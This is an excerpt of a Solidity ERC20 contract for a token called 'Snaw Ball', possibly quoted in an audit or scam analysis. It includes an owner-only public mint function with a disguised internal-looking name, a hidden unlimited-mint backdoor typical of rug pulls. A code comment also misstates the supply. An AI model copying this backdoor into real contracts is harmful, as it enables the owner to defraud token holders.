...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Snawball(uint256 amount) public onlyOwner {
 _Snawball(msg.sender, amount);
    }
    ...
    function _Snawball(address account, uint256 amount) internal virtual {
...
contract $Snawball is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Snaw Ball", "SNAWBALL") {
     _Snawball(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}